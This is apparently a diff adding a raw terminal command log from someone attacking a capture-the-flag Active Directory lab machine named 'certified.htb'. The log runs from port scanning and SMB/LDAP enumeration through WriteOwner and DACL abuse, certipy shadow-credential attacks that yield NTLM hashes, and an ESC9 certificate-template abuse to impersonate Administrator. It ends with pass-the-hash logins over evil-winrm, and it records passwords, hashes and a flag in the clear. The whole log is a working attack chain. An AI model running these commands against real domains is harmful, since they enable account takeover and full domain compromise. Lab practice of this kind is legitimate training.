@@ -1,0 +1,229 @@
+[2026-01-24 14:04:43] [pane=%0] [CMD] cd certified
+[2026-01-24 14:04:44] [pane=%0] [CMD] ll
+[2026-01-24 14:04:46] [pane=%0] [CMD] cd nmpa
+[2026-01-24 14:04:51] [pane=%0] [CMD] cd nmap
+[2026-01-24 14:05:04] [pane=%0] [CMD] ll
+[2026-01-24 14:06:11] [pane=%1] [CMD] vim ~/.ip
+[2026-01-24 14:07:16] [pane=%0] [CMD] nmap -p- --min-rate=3000 -vvv 10.129.231.186
+[2026-01-24 14:07:26] [pane=%1] [CMD] ip a
+[2026-01-24 14:10:18] [pane=%0] [CMD] nmap -p- --min-rate=3000 -vvv 10.129.231.186 -oN certifiedNmapOpenPorts.txt
+[2026-01-24 14:12:34] [pane=%0] [CMD] ports=$(awk '/^[0-9]+\/tcp/ {print $1}' certifiedNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)
+[2026-01-24 14:12:43] [pane=%0] [CMD] echo $ports
+[2026-01-24 14:14:06] [pane=%0] [CMD] nmap -p$port -sSCV --min-rate=2000 -Pn -oN certifiedNmapServicesVersions.txt 10.129.231.186 
+[2026-01-24 14:14:28] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN certifiedNmapServicesVersions.txt 10.129.231.186 
+[2026-01-24 14:15:46] [pane=%1] [CMD] cd certified/nma
+[2026-01-24 14:15:50] [pane=%1] [CMD] cd certified/nmap
+[2026-01-24 14:15:51] [pane=%1] [CMD] ll
+[2026-01-24 14:16:05] [pane=%1] [CMD] ll
+[2026-01-24 14:18:49] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-01-24 14:23:26] [pane=%1] [CMD] : #note starting box with credentials Username: judith.mader Password: judith09
+[2026-01-24 14:27:57] [pane=%0] [CMD] impacket-smbclient cd01.certified.htb/@certified.htb
+[2026-01-24 14:30:47] [pane=%1] [CMD] : #note command $impacket-smbclient cd01.certified.htb/@certified.htb gives us smb access with null session but nothing is allowed.
+[2026-01-24 14:32:04] [pane=%0] [CMD] nxc smb frizzDC.frizz.htb -u judith09 -p 'judith09'
+[2026-01-24 14:33:45] [pane=%0] [CMD] nxc smb frizzDC.frizz.htb -u judith09 -p 'judith09' 10.129.231.186
+[2026-01-24 14:34:21] [pane=%0] [CMD] nxc smb DC01.certified.htb -u judith09 -p 'judith09' 10.129.231.186
+[2026-01-24 14:34:49] [pane=%0] [CMD] nxc smb DC01.certified.htb -u judith09 -p 'judith09'
+[2026-01-24 14:35:43] [pane=%0] [CMD] sudo vim /etc/hosts
+[2026-01-24 14:36:20] [pane=%0] [CMD] impacket-smbclient dc01.certified.htb/@certified.htb
+[2026-01-24 14:42:38] [pane=%0] [CMD] impacket-smbclient dc01.certified.htb/certified@10.129.231.186
+[2026-01-24 14:44:26] [pane=%0] [CMD] impacket-smbclient dc01/certified:'judith09'@10.129.231.186
+[2026-01-24 14:46:14] [pane=%0] [CMD] impacket-smbclient dc01/judith.mader:'judith09'@10.129.231.186
+[2026-01-24 14:47:22] [pane=%0] [CMD] impacket-smbclient DC01.certified.htb/judith.mader:'judith09'@10.129.231.186
+[2026-01-24 14:52:29] [pane=%1] [CMD] : #note command impacket-smbclient DC01.certified.htb/judith.mader:'judith09'@10.129.231.186 -- gives us a smb share as judith
+[2026-01-24 15:02:39] [pane=%0] [CMD] smbmap -u 'judith.mader' -p 'judith09' -d certified.htb -H 10.129.231.186
+[2026-01-24 15:03:13] [pane=%0] [CMD] smbmap -u 'judith.mader' -p 'judith09' -d certified.htb -H 10.129.231.186 -r
+[2026-01-24 15:04:04] [pane=%0] [CMD] cd //
+[2026-01-24 15:04:08] [pane=%0] [CMD] cd -
+[2026-01-24 15:04:10] [pane=%0] [CMD] cd ../
+[2026-01-24 15:04:14] [pane=%0] [CMD] ll
+[2026-01-24 15:05:43] [pane=%0] [CMD] cd evidence
+[2026-01-24 15:06:39] [pane=%0] [CMD] smbmap -u 'judith.mader' -p 'judith09' -d certified.htb -H 10.129.231.186 -r > smbmapJudithMader.txt
+[2026-01-24 15:07:26] [pane=%0] [CMD] smbmap -u 'judith.mader' -p 'judith09' -d certified.htb -H 10.129.231.186 -r > smbmapJudithMader.txt
+[2026-01-24 15:07:38] [pane=%0] [CMD] cat smbmapJudithMader.txt
+[2026-01-24 15:08:26] [pane=%0] [CMD] smbmap -u 'judith.mader' -p 'judith09' -d certified.htb -H 10.129.231.186 -r | tee smbmapJudithMader.txt
+[2026-01-24 15:22:02] [pane=%0] [CMD] impacket-smbclient DC01.certified.htb/judith.mader:'judith09'@10.129.231.186
+[2026-01-24 15:27:30] [pane=%1] [CMD] ll
+[2026-01-24 15:27:32] [pane=%1] [CMD] cd ..
+[2026-01-24 15:27:32] [pane=%1] [CMD] ll
+[2026-01-24 15:28:14] [pane=%1] [CMD] cd ..evidence
+[2026-01-24 15:28:19] [pane=%1] [CMD] cd evidence
+[2026-01-24 15:28:20] [pane=%1] [CMD] dir
+[2026-01-24 15:28:26] [pane=%1] [CMD] cat cert
+[2026-01-24 15:30:47] [pane=%1] [CMD] ll
+[2026-01-24 15:37:52] [pane=%1] [CMD] cd ..
+[2026-01-24 15:37:55] [pane=%1] [CMD] cd nmap
+[2026-01-24 15:38:04] [pane=%1] [CMD] ll
+[2026-01-24 15:38:10] [pane=%1] [CMD] cat certifiedNmapServicesVersions.txt
+[2026-01-25 16:51:12] [pane=%1] [CMD] certipy find -u judith.mader -p 'judith09' -dc-ip 10.129.231.186 -stdout > ../loot/certipyOutput.txt
+[2026-01-25 16:51:49] [pane=%1] [CMD] cd ../loot
+[2026-01-25 16:51:50] [pane=%1] [CMD] ll
+[2026-01-25 16:51:53] [pane=%1] [CMD] cat certipyOutput.txt
+[2026-01-25 17:10:25] [pane=%1] [CMD] : #note Certipy output suggests ESC2 and ESC3 can be targeted but they are not a vulnerability by themselves. 
+[2026-01-25 17:13:11] [pane=%1] [CMD] : #note Certipy output suggests template #0 'CertifiedAuthentication' is a custom template created may 2024. 1000 year validity is highly unusual. Enrollment rights granted to a custom group - 'operator ca'. this is not a standard AD group
+[2026-01-25 17:16:16] [pane=%1] [CMD] bloodhound-python -u judith.mader -p 'judith09' -d certified.htb -ns 10.129.231.186 -c All --zip
+[2026-01-25 17:20:07] [pane=%1] [CMD] cd ../
+[2026-01-25 17:20:08] [pane=%1] [CMD] ll
+[2026-01-25 17:20:27] [pane=%1] [CMD] cd evidence
+[2026-01-25 17:20:27] [pane=%1] [CMD] ll
+[2026-01-25 17:21:00] [pane=%1] [CMD] bloodhound-python -u judith.mader -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zip
+[2026-01-25 17:21:15] [pane=%1] [CMD] ll
+[2026-01-25 18:09:05] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b "DC=certified,DC=htb" "(sAMAccountName=management_svc)" memberOf | grep memberOf tee ../logs/management_svc-groups.txt
+[2026-01-25 18:09:19] [pane=%1] [CMD] cd ../logs
+[2026-01-25 18:09:20] [pane=%1] [CMD] ll
+[2026-01-25 18:09:39] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b "DC=certified,DC=htb" "(sAMAccountName=management_svc)" memberOf | grep memberOf | tee management_svc-groups.txt
+[2026-01-25 18:11:00] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b "DC=certified,DC=htb" "(cn-operator ca)" member | grep member | tee operator-ca-members.txt
+[2026-01-25 18:11:10] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w    
+  'judith09' -b 'DC=certified,DC=htb' '(cn=operator ca)' member | grep member |
+   tee logs/operator-ca-members.txt 
+[2026-01-25 18:11:27] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(cn=operator ca)' member | grep member |tee logs/operator-ca-members.txt 
+[2026-01-25 18:11:37] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(cn=operator ca)' member | grep member |tee operator-ca-members.txt 
+[2026-01-25 18:11:56] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b "DC=certified,DC=htb" "(sAMAccountName=management_svc)" memberOf | grep memberOf | tee management_svc-groups.txt
+[2026-01-25 18:12:46] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w    
+  'judith09' -b 'DC=certified,DC=htb' '(objectClass=group)' cn | grep '^cn:'  tee all-groups.txt 
+[2026-01-25 18:13:33] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(objectClass=group)' cn | grep '^cn:' |  tee all-groups.txt
+[2026-01-26 14:03:20] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(cn=operatort ca)'
+[2026-01-26 14:06:30] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(cn=operatort ca)'
+[2026-01-26 14:22:01] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(cn=operator ca)'
+[2026-01-26 14:59:52] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(cn=operator ca)' nTSecurityDescriptor | tee operator-ca-acl.txt
+[2026-01-26 15:00:55] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(cn=operator ca)' nTSecurityDescriptor | tee operator-ca-acl.txt
+[2026-01-26 15:01:16] [pane=%1] [CMD] bloodyAD -d certified.htb -u judith.mader -p 'judith09' --host 10.129.231.186 get object 'operator ca' --resolve-sd
+[2026-01-26 15:04:19] [pane=%1] [CMD] bloodyAD -d certified.htb -u judith.mader -p 'judith09' --host 10.129.231.186 set owner 'Management' 'judith.mader'
+[2026-01-26 15:06:31] [pane=%1] [CMD] bloodyAD -d certified.htb -u judith.mader -p 'judith09' --host 10.129.231.186 add genericAll 'Management' 'judith.mader'
+[2026-01-26 15:07:01] [pane=%1] [CMD] : #note used bloodyAD to set the owner of Management to judith.mader. this abuses WriteOwner permission to take control.
+[2026-01-26 15:08:21] [pane=%1] [CMD] : #note used bloodyAD to grant full control of Management to judith.mader. judith.mader can now modify group membership, permissions, etc.
+[2026-01-26 15:09:14] [pane=%1] [CMD] bloodyAD -d certified.htb -u judith.mader -p 'judith09' --host 10.129.231.186 add groupMember 'Management' 'judith.mader'
+[2026-01-26 15:10:49] [pane=%1] [CMD] : #note used bloodyAD to add judith.mader to group, Management. after this command was run, judity mader is a member of Management. 
+[2026-01-26 15:11:08] [pane=%1] [CMD] ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(sAMAccountName=judith.mader)' memberOf | grep memberOf
+[2026-01-26 15:15:22] [pane=%1] [CMD] bloodyAD -d certified.htb -u judith.mader -p 'judith09' --host 10.129.231.186 set password 'management_svc' 'Newpassword123!'
+[2026-01-26 15:20:34] [pane=%1] [CMD] impacket-GetUserSPNs certified.htb/judith.mader:'judith09' -dc-ip 10.10.11.51 -request
+[2026-01-26 15:20:50] [pane=%1] [CMD] impacket-GetUserSPNs certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186 -request
+[2026-01-26 15:44:41] [pane=%1] [CMD] sudo ntpdate 10.129.231.186
+[2026-01-26 22:48:42] [pane=%1] [CMD] sudo ntpdate 10.129.231.186
+[2026-01-26 22:48:57] [pane=%1] [CMD] impacket-GetUserSPNs certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186 -request
+[2026-01-26 22:49:16] [pane=%1] [CMD] impacket-GetUserSPNs certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186 -request
+[2026-01-26 22:49:32] [pane=%1] [CMD] sudo ntpdate 10.129.231.186
+[2026-01-26 22:49:49] [pane=%1] [CMD] sudo ntpdate -s 10.129.231.186
+[2026-01-26 22:49:59] [pane=%1] [CMD] impacket-GetUserSPNs certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186 -request
+[2026-01-26 23:22:27] [pane=%1] [CMD] sudo ntpdate -s 10.129.231.186
+[2026-01-26 23:23:22] [pane=%1] [CMD] impacket-GetUserSPNs certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186 -request
+[2026-01-26 23:24:48] [pane=%1] [CMD] net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-26 23:35:57] [pane=%1] [CMD] : #note none of the BloodyAD commands successfull changed anything. pivoting to something else
+[2026-01-26 23:37:51] [pane=%1] [CMD] : #note attempting to exploit the WriteOwner permission between judith.mader and management with impacket-owneredit.
+[2026-01-26 23:43:07] [pane=%1] [CMD] impacket-owneredit -action write -new-owner judith.mader -target management certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186
+[2026-01-26 23:45:36] [pane=%1] [CMD] ./targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
+[2026-01-26 23:47:26] [pane=%1] [CMD] wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
+[2026-01-26 23:47:57] [pane=%1] [CMD] sudo chmod +x targetedKerberoast.py
+[2026-01-26 23:48:04] [pane=%1] [CMD] ./targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
+[2026-01-26 23:49:35] [pane=%1] [CMD] sudo ntpdate -s 10.129.231.186
+[2026-01-27 00:12:27] [pane=%1] [CMD] sudo ntpdate
+[2026-01-27 00:18:38] [pane=%1] [CMD] sudo ntpdate 17:18:00
+[2026-01-27 00:18:47] [pane=%1] [CMD] ntpdate
+[2026-01-27 00:18:53] [pane=%1] [CMD] ntpdate --help
+[2026-01-26 17:22:51] [pane=%1] [CMD] impacket-owneredit -action write -owner judith.mader -target management certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186
+[2026-01-26 17:23:34] [pane=%1] [CMD] impacket-owneredit -action write -new-0owner judith.mader -target management certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186
+[2026-01-26 17:23:44] [pane=%1] [CMD] impacket-owneredit -action write -new0owner judith.mader -target management certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186
+[2026-01-26 17:23:57] [pane=%1] [CMD] impacket-owneredit -action write -new-owner judith.mader -target management certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186
+[2026-01-26 17:25:59] [pane=%1] [CMD] impacket-owneredit -new-owner judith.mader -target management -action write certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
+[2026-01-26 17:28:06] [pane=%1] [CMD] impacket-dacledit -action write -rights WriteMembers -principal judith.mader -target Management certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186
+[2026-01-26 17:28:50] [pane=%1] [CMD] net rpc group members addmem Management judith.mader -U
+[2026-01-26 17:29:03] [pane=%1] [CMD] net rpc group addmem Management judith.mader -U
+[2026-01-26 17:30:37] [pane=%1] [CMD] net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-26 17:31:11] [pane=%1] [CMD] net rpc group members Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-26 17:31:39] [pane=%1] [CMD] net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-26 17:34:23] [pane=%1] [CMD] : #note used impacket-owneredit to make judith.mader owner over management
+[2026-01-26 17:35:15] [pane=%1] [CMD] : #note used impacket-dacledit to give judith rights to add users
+[2026-01-26 17:35:37] [pane=%1] [CMD] : #note used net rpc to add judith.mader to the Management group
+[2026-01-26 17:35:53] [pane=%1] [CMD] net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-26 17:36:35] [pane=%1] [CMD] ./targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
+[2026-01-26 17:39:32] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-26 17:40:36] [pane=%1] [CMD] sudo ntpdate -s 10.129.231.186
+[2026-01-26 17:41:14] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-26 17:42:24] [pane=%1] [CMD] sudo ntpdate 10.129.231.186
+[2026-01-26 17:42:33] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-26 17:54:20] [pane=%1] [CMD] net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-26 17:55:03] [pane=%1] [CMD] sudo ntpdate 10.129.231.186
+[2026-01-27 00:59:54] [pane=%1] [CMD] impacket-owneredit -new-owner judith.mader -target management -action write certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
+[2026-01-27 01:00:07] [pane=%1] [CMD] impacket-dacledit -action write -rights WriteMembers -principal judith.mader -target Management certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186
+[2026-01-27 01:00:33] [pane=%1] [CMD] net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-27 01:00:54] [pane=%1] [CMD] net rpc group members Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-27 01:01:17] [pane=%1] [CMD] net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-27 01:02:31] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-27 00:04:54] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-27 00:05:16] [pane=%1] [CMD] net rpc group members Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-27 00:05:26] [pane=%1] [CMD] net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-27 00:06:05] [pane=%1] [CMD] owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.129.186
+[2026-01-27 00:07:33] [pane=%1] [CMD] owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.129.231.186
+[2026-01-27 00:07:48] [pane=%1] [CMD] dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.129.231.186
+[2026-01-27 00:08:07] [pane=%1] [CMD] net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-27 00:08:22] [pane=%1] [CMD] net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
+[2026-01-27 00:08:33] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-27 00:14:57] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-27 00:15:51] [pane=%1] [CMD] sudo ntpdate 10.129.231.186
+[2026-01-27 00:16:02] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-27 00:17:51] [pane=%1] [CMD] sudo ntpdate -s 10.129.231.186
+[2026-01-27 00:17:57] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-27 00:20:20] [pane=%1] [CMD] sudo systemctl stop systemd-timesyncd
+[2026-01-27 00:20:34] [pane=%1] [CMD] sudo systemctl disable systemd-timesyncd
+[2026-01-27 00:20:58] [pane=%1] [CMD] sudo ntpdate 10.129.231.186
+[2026-01-27 00:21:11] [pane=%1] [CMD] sudo ntpdate -s 10.129.231.186
+[2026-01-27 07:20:48] [pane=%1] [CMD] certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
+[2026-01-27 07:22:28] [pane=%1] [CMD] : #note I had to stop and disable the systemd-timesyncd service and then sudo nrpdate -s 10.129.231.186 to be able to attack kerberos with certipy
+[2026-01-27 07:24:24] [pane=%1] [CMD] nxc smb DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
+[2026-01-27 07:24:58] [pane=%1] [CMD] : #note certipy wizardry pulled hash for management_svc : a091c1832bcdd4677c28b5a6a1295584
+[2026-01-27 07:26:18] [pane=%1] [CMD] evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
+[2026-01-27 07:27:09] [pane=%0] [CMD] : #note evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 logs us into management_svc
+
+[2026-01-27 07:29:05] [pane=%0] [CMD] : #note user.txt flag is in management_svc's Desktop directory : 62929513fad79d1416b71f041d940571
+[2026-01-27 10:35:35] [pane=%1] [CMD] evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
+[2026-01-27 11:01:17] [pane=%0] [CMD] impacket-GetUserSPNs certified.htb/management_svc -hashes: 'a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -request -outputfile ../loot/kerberoast-management_svc.txt
+[2026-01-27 11:01:40] [pane=%0] [CMD] impacket-GetUserSPNs certified.htb/management_svc -hashes:'a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -request -outputfile ../loot/kerberoast-management_svc.txt
+[2026-01-27 11:02:10] [pane=%0] [CMD] impacket-GetUserSPNs certified.htb/management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -request -outputfile loot/kerberoast-management_svc.txt
+[2026-01-27 17:03:30] [pane=%0] [CMD] impacket-GetUserSPNs certified.htb/management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -request -outputfile loot/kerberoast-management_svc.txt
+[2026-01-27 17:03:46] [pane=%0] [CMD] impacket-GetUserSPNs certified.htb/management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -request -outputfile loot/kerberoast-management_svc.txt
+[2026-01-27 17:04:35] [pane=%0] [CMD] sudo ntpdate -s 10.129.231.186
+[2026-01-28 00:05:22] [pane=%0] [CMD] impacket-GetUserSPNs certified.htb/management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -request -outputfile loot/kerberoast-management_svc.txt
+[2026-01-28 00:05:42] [pane=%0] [CMD] cd ../loot
+[2026-01-28 00:05:50] [pane=%0] [CMD] impacket-GetUserSPNs certified.htb/management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -request -outputfile kerberoast-management_svc.txt
+[2026-01-28 00:11:55] [pane=%0] [CMD] ll
+[2026-01-28 00:12:04] [pane=%0] [CMD] cd ../evidence
+[2026-01-28 00:12:05] [pane=%0] [CMD] ll
+[2026-01-28 00:34:11] [pane=%1] [CMD] evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
+[2026-01-28 00:36:35] [pane=%1] [CMD] sudo vim /etc/hosts
+[2026-01-28 00:38:52] [pane=%1] [CMD] sudo vim /etc/hosts
+[2026-01-28 00:39:07] [pane=%1] [CMD] evil-winrm -i 10.129.2.172 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
+[2026-01-28 00:48:02] [pane=%0] [CMD] evil-winrm -i 10.129.2.172 -u ca_operator -p 'Password123!'
+[2026-01-28 00:54:03] [pane=%0] [CMD] certipy shadow auto -u management_svc@sequel.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account 'ca_operator' -target certified.htb -dc-ip 10.129.2.172
+[2026-01-28 00:54:30] [pane=%0] [CMD] ll
+[2026-01-28 00:55:20] [pane=%0] [CMD] nxc smb DC01.certified.htb -u ca_operator -H 'b4b86f45c6018f1b664f70805f45d8f2'
+[2026-01-28 00:57:41] [pane=%0] [CMD] : #note used certipy shadow to obtain the hash for ca_operator 
+[2026-01-28 00:58:42] [pane=%0] [CMD] : #note used nxc smb to check if hash for ca_operator works and it does
+[2026-01-28 00:59:07] [pane=%0] [CMD] evil-winrm -i 10.129.2.172 -u ca_operator -H 'b4b86f45c6018f1b664f70805f45d8f2'
+[2026-01-28 01:00:30] [pane=%0] [CMD] : #note used evil-winrm to try an logon with operator_ca hash but it does not allow us.
+[2026-01-28 01:02:33] [pane=%0] [CMD] certipy find -vulnerable -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.2.172 -stdout > ../loot/certipy-ca_operator-vuln.txt
+[2026-01-28 01:03:01] [pane=%0] [CMD] ll
+[2026-01-28 01:03:21] [pane=%0] [CMD] cat ../loot/certipy-ca_operator-vuln.txt
+[2026-01-28 01:09:41] [pane=%0] [CMD] : #note used certipy find vulnerable with operator_ca hash. looks like ESC9 called CertifiedAuthenticationthat is vulnerable
+[2026-01-28 02:10:03] [pane=%1] [CMD] sudo vim /etc/hosts
+[2026-01-28 02:11:34] [pane=%0] [CMD] certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administator -dc-ip 10.129.231.186
+[2026-01-28 02:12:17] [pane=%0] [CMD] : #note successfully used certipy to change ca_operator UPN to Administrator
+[2026-01-28 02:14:35] [pane=%0] [CMD] certipy req -u ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -ca certified-DC01-CA-template CertifiedAuthentication
+[2026-01-28 02:15:58] [pane=%0] [CMD] certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
+[2026-01-28 02:16:51] [pane=%0] [CMD] : #note successfully used certipy to request certificate as ca_operator - will have Administrator UPN
+[2026-01-28 02:19:35] [pane=%0] [CMD] certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
+[2026-01-28 02:19:41] [pane=%0] [CMD] ll
+[2026-01-28 02:20:07] [pane=%0] [CMD] cp administator.pfx administrator.pfx
+[2026-01-28 02:20:09] [pane=%0] [CMD] certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
+[2026-01-28 02:20:36] [pane=%0] [CMD] certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
+[2026-01-28 02:21:55] [pane=%0] [CMD] certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.231.186
+[2026-01-28 02:22:23] [pane=%0] [CMD] certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
+[2026-01-28 02:22:38] [pane=%0] [CMD] ll
+[2026-01-28 02:23:13] [pane=%0] [CMD] certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.231.186
+[2026-01-28 02:23:28] [pane=%0] [CMD] ll
+[2026-01-28 02:23:45] [pane=%0] [CMD] rm administator.pfx administrator.pfx
+[2026-01-28 02:23:52] [pane=%0] [CMD] certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
+[2026-01-28 02:24:27] [pane=%0] [CMD] certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
+[2026-01-28 02:25:01] [pane=%0] [CMD] certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
+[2026-01-28 02:26:02] [pane=%0] [CMD] evil-winrm -i certified.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
+[2026-01-28 02:26:34] [pane=%0] [CMD] evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34
+[2026-01-27 22:54:01] [pane=%0] [CMD] exit
+[2026-01-27 22:54:05] [pane=%1] [CMD] exit
